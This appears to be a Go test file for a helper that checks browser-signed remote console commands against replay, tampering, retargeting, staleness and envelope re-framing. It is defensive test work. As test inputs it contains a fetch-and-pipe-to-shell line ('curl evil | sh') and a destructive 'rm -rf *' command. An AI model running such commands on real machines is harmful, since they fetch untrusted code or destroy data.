package main

// What a signature is actually being asked to stop.
//
// The interesting cases are not "a good signature passes". They are the ones a
// relay could try if it wanted to run something here: send an unsigned command,
// re-send one it saw earlier, move a command to a different machine, or change
// the kind while keeping the signature that came with it.

import (
	"crypto/ed25519"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strconv"
	"testing"
	"time"
)

func signedCmd(t *testing.T, priv ed25519.PrivateKey, agent string, c consoleCmd) consoleCmd {
	t.Helper()
	if c.IssuedAt == 0 {
		c.IssuedAt = time.Now().Unix()
	}
	msg := commandSigningInput(agent, c.ID, c.Kind, c.Target, c.IssuedAt, c.Cmd)
	c.Sig = base64.StdEncoding.EncodeToString(ed25519.Sign(priv, msg))
	return c
}

func TestVerifyCommandRefusesWhatARelayCouldTry(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	keys := trust{keys: []ed25519.PublicKey{pub}, sealed: true}
	now := time.Now()
	const agent = "ho2JBnXCez_Q"

	good := signedCmd(t, priv, agent, consoleCmd{ID: "c1", Kind: "sh", Cmd: "uptime"})
	if why := verifyCommand(good, agent, keys, now); why != "" {
		t.Fatalf("a properly signed command was refused: %s", why)
	}

	// Single use. The relay holds every command it ever forwarded, and a
	// signature does not expire on its own.
	if why := verifyCommand(good, agent, keys, now); why != "replayed-command" {
		t.Errorf("second delivery of the same command: %q, want replayed-command", why)
	}

	for _, tc := range []struct {
		name string
		cmd  consoleCmd
		want string
	}{
		{"no signature at all",
			consoleCmd{ID: "c2", Kind: "sh", Cmd: "uptime"}, "unsigned"},
		{"signature that is not base64",
			consoleCmd{ID: "c3", Kind: "sh", Cmd: "uptime", Sig: "!!!", IssuedAt: now.Unix()}, "bad-signature"},
		{"a signature from somebody else's key",
			func() consoleCmd {
				_, other, _ := ed25519.GenerateKey(nil)
				return signedCmd(t, other, agent, consoleCmd{ID: "c4", Kind: "sh", Cmd: "uptime"})
			}(), "bad-signature"},
		{"command text changed after signing",
			func() consoleCmd {
				c := signedCmd(t, priv, agent, consoleCmd{ID: "c5", Kind: "sh", Cmd: "uptime"})
				c.Cmd = "curl evil | sh"
				return c
			}(), "bad-signature"},
		{"kind changed from sh to update",
			func() consoleCmd {
				c := signedCmd(t, priv, agent, consoleCmd{ID: "c6", Kind: "sh", Cmd: "uptime"})
				c.Kind = "update"
				return c
			}(), "bad-signature"},
		{"aimed at a different machine",
			signedCmd(t, priv, "someone-else", consoleCmd{ID: "c7", Kind: "sh", Cmd: "uptime"}),
			"bad-signature"},
		{"signed an hour ago and held",
			signedCmd(t, priv, agent, consoleCmd{ID: "c8", Kind: "sh", Cmd: "uptime",
				IssuedAt: now.Add(-time.Hour).Unix()}), "stale-command"},
		{"dated an hour ahead",
			signedCmd(t, priv, agent, consoleCmd{ID: "c9", Kind: "sh", Cmd: "uptime",
				IssuedAt: now.Add(time.Hour).Unix()}), "stale-command"},
		{"signed but carrying no timestamp",
			func() consoleCmd {
				c := signedCmd(t, priv, agent, consoleCmd{ID: "c10", Kind: "sh", Cmd: "uptime"})
				c.IssuedAt = 0
				return c
			}(), "bad-signature"},
	} {
		if why := verifyCommand(tc.cmd, agent, keys, now); why != tc.want {
			t.Errorf("%s: got %q, want %q", tc.name, why, tc.want)
		}
	}
}

// The forgery v1 allowed, and the reason the envelope carries lengths.
//
// Joining fields with newlines means a newline INSIDE a field is
// indistinguishable from the separator: a signature over a two-line shell
// command is, byte for byte, a signature over (target: "\n<first line>",
// cmd: "<second line>"). The helper ignores target for `sh`, so a relay could
// deliver the second half of a signed command on its own — dropping the `cd`
// off a `cd /safe && rm -rf *`, or the `set -e` off everything after it.
func TestFieldsCannotBeReCutAcrossTheEnvelope(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	keys := trust{keys: []ed25519.PublicKey{pub}, sealed: true}
	now := time.Now()
	const agent = "ho2JBnXCez_Q"

	/* Its own id: `seen` is one set for the whole process, so an id another
	   test already spent would come back here as a replay. */
	signed := signedCmd(t, priv, agent, consoleCmd{
		ID: "recut-1", Kind: "sh", Cmd: "cd /safe\nrm -rf *"})
	forged := signed
	forged.Target = "\ncd /safe"
	forged.Cmd = "rm -rf *"

	if why := verifyCommand(forged, agent, keys, now); why != "bad-signature" {
		t.Fatalf("a relay re-cut a signed command and got %q, want bad-signature", why)
	}
	// And the original still verifies, so the fix is framing rather than a
	// blanket refusal of commands with newlines in them.
	if why := verifyCommand(signed, agent, keys, now); why != "" {
		t.Fatalf("the real two-line command was refused: %s", why)
	}
}

// Every field is length-prefixed, so no two distinct commands share an input.
func TestSigningInputIsUnambiguous(t *testing.T) {
	seen := map[string]string{}
	for _, c := range []struct{ name, agent, id, kind, target, cmd string }{
		{"plain", "a", "1", "sh", "", "x"},
		{"newline moved into target", "a", "1", "sh", "\n", "x"},
		{"colon in the command", "a", "1", "sh", "", "2:x"},
		{"agent and id run together", "a1", "", "sh", "", "x"},
		{"empty agent", "", "a1", "sh", "", "x"},
	} {
		got := string(commandSigningInput(c.agent, c.id, c.kind, c.target, 1, c.cmd))
		if prev, dup := seen[got]; dup {
			t.Errorf("%s signs the same bytes as %s", c.name, prev)
		}
		seen[got] = c.name
	}
}

// A list that exists and holds nothing usable is NOT the same as no list.
// Treating it as "nothing pinned" would turn a bad permission bit into a
// silent downgrade back to "the relay may command this machine".
func TestABrokenTrustFileRefusesEverything(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	if err := os.MkdirAll(filepath.Dir(trustedKeysPath()), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(trustedKeysPath(), []byte("not-a-key\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	tr := loadTrust()
	if !tr.sealed || len(tr.keys) != 0 {
		t.Fatalf("sealed=%v keys=%d, want sealed with no keys", tr.sealed, len(tr.keys))
	}
	_, priv, _ := ed25519.GenerateKey(nil)
	c := signedCmd(t, priv, "abc", consoleCmd{ID: "c1", Kind: "sh", Cmd: "uptime"})
	if why := verifyCommand(c, "abc", tr, time.Now()); why != "trust-unreadable" {
		t.Errorf("got %q, want trust-unreadable", why)
	}
	// An unsigned command is refused for the same reason rather than run.
	if why := verifyCommand(consoleCmd{ID: "c2", Kind: "sh", Cmd: "uptime"}, "abc", tr, time.Now()); why != "trust-unreadable" {
		t.Errorf("unsigned against a broken list: %q, want trust-unreadable", why)
	}

	// Comments and blank lines are not "content": an empty file is how the last
	// key is removed, and it must return the machine to unsigned operation.
	if err := os.WriteFile(trustedKeysPath(), []byte("# everything removed\n\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if tr := loadTrust(); tr.sealed {
		t.Error("a file of comments sealed the machine")
	}
}

// Single-use has to outlast a busy machine: ids are forgotten by AGE, never by
// count, or the one worth replaying falls out of the set while its signature is
// still fresh.
func TestRememberedIDsSurviveABusyMachine(t *testing.T) {
	seen.Lock()
	seen.at = map[string]time.Time{}
	seen.Unlock()
	now := time.Now()

	if why := rememberCommand("first", now); why != "" {
		t.Fatalf("first command: %q", why)
	}
	for i := 0; i < seenIDsMax+50; i++ {
		rememberCommand("filler-"+strconv.Itoa(i), now)
	}
	if why := rememberCommand("first", now); why != "replayed-command" {
		t.Errorf("the first id was forgotten while still fresh: %q", why)
	}
	// Past the window, forgetting is correct — a command that old is refused as
	// stale before it ever reaches here.
	if why := rememberCommand("first", now.Add(commandSkew+time.Second)); why != "" {
		t.Errorf("an id outside the window was still held: %q", why)
	}
}

// The compatibility rule, which is the one that decides whether this can ship:
// a machine that has pinned nothing keeps working exactly as before.
func TestUnpinnedMachineStillTakesCommands(t *testing.T) {
	c := consoleCmd{ID: "c1", Kind: "sh", Cmd: "uptime"}
	if why := verifyCommand(c, "abc", trust{}, time.Now()); why != "" {
		t.Fatalf("an unpinned machine refused an unsigned command: %s", why)
	}
}

// A second browser is added at the keyboard, and both keys work afterwards.
func TestTrustFileAddsAndRemovesKeys(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))

	if got := loadTrust(); len(got.keys) != 0 {
		t.Fatalf("a fresh machine starts with %d keys, want 0", len(got.keys))
	}
	pubA, privA, _ := ed25519.GenerateKey(nil)
	pubB, privB, _ := ed25519.GenerateKey(nil)
	encA := base64.StdEncoding.EncodeToString(pubA)
	encB := base64.StdEncoding.EncodeToString(pubB)

	if err := trustKey(encA + " laptop"); err != nil { // a label is allowed
		t.Fatal(err)
	}
	if err := trustKey(encB); err != nil {
		t.Fatal(err)
	}
	if err := trustKey(encA); err != nil { // adding twice is not an error
		t.Fatal(err)
	}
	keys := loadTrust().keys
	if len(keys) != 2 {
		t.Fatalf("trusted %d keys, want 2", len(keys))
	}
	for i, priv := range []ed25519.PrivateKey{privA, privB} {
		c := signedCmd(t, priv, "abc", consoleCmd{ID: string(rune('a' + i)), Kind: "sh", Cmd: "uptime"})
		if why := verifyCommand(c, "abc", trust{keys: keys, sealed: true}, time.Now()); why != "" {
			t.Errorf("key %d could not command: %s", i, why)
		}
	}
	// The file is not world-readable: it decides who may run commands here.
	st, err := os.Stat(trustedKeysPath())
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm()&0o077 != 0 {
		t.Errorf("trusted-keys is mode %v", st.Mode().Perm())
	}

	if err := untrustKey(encA); err != nil {
		t.Fatal(err)
	}
	keys = loadTrust().keys
	if len(keys) != 1 || !keys[0].Equal(pubB) {
		t.Fatalf("after untrust: %d keys left", len(keys))
	}
	c := signedCmd(t, privA, "abc", consoleCmd{ID: "z", Kind: "sh", Cmd: "uptime"})
	if why := verifyCommand(c, "abc", trust{keys: keys, sealed: true}, time.Now()); why != "bad-signature" {
		t.Errorf("a removed key still commands: %q", why)
	}
	// Removing the last one returns the machine to unsigned operation rather
	// than bricking its console — a real choice, made at the keyboard.
	if err := untrustKey(encB); err != nil {
		t.Fatal(err)
	}
	if got := loadTrust(); len(got.keys) != 0 || got.sealed {
		t.Fatalf("%d keys left after removing both (sealed=%v)", len(got.keys), got.sealed)
	}
}

// Garbage in the file is skipped rather than taken as a key. A file with one
// real key among the junk is usable; a file of nothing BUT junk is a different
// case entirely and is covered by TestABrokenTrustFileRefusesEverything.
func TestTrustFileIgnoresJunkLines(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	pub, _, _ := ed25519.GenerateKey(nil)
	body := "# a comment\n\n" +
		"not-base64!!!\n" +
		base64.StdEncoding.EncodeToString([]byte("too short")) + "\n" +
		base64.StdEncoding.EncodeToString(pub) + "  desktop\n"
	if err := os.MkdirAll(filepath.Dir(trustedKeysPath()), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(trustedKeysPath(), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	keys := loadTrust().keys
	if len(keys) != 1 || !keys[0].Equal(pub) {
		t.Fatalf("parsed %d keys from a file with one real one", len(keys))
	}
}

// The one thing no amount of Go-only testing can prove: that the browser and
// this helper agree, byte for byte, on what was signed. The fixture was
// produced by WebCrypto — the same call the panel makes — from the panel's own
// signingInput, lifted out of monitor.js rather than copied, so a change to the
// signing input on either side fails HERE rather than in the field, where the
// symptom would be every command refused as bad-signature.
//
// Regenerate deliberately, never to make this pass. From the repo root:
//
//	node helper/go/testdata/gen-browser-signature.mjs > helper/go/testdata/browser-signature.json
func TestAWebCryptoSignatureVerifiesHere(t *testing.T) {
	body, err := os.ReadFile(filepath.Join("testdata", "browser-signature.json"))
	if err != nil {
		t.Fatal(err)
	}
	var f struct {
		Pub, Agent, ID, Kind, Target, Cmd, Sig string
		At                                     int64
	}
	if err := json.Unmarshal(body, &f); err != nil {
		t.Fatal(err)
	}
	key := parsePublicKey(f.Pub)
	if key == nil {
		t.Fatal("the fixture's public key does not parse")
	}
	c := consoleCmd{ID: f.ID, Kind: f.Kind, Target: f.Target, Cmd: f.Cmd, Sig: f.Sig, IssuedAt: f.At}
	// The fixture is older than any freshness window, so verify against its own
	// moment: what is under test is the signing input, not the clock.
	if why := verifyCommand(c, f.Agent, trust{keys: []ed25519.PublicKey{key}, sealed: true}, time.Unix(f.At, 0)); why != "" {
		t.Fatalf("a signature made in a browser was refused here: %s", why)
	}
}
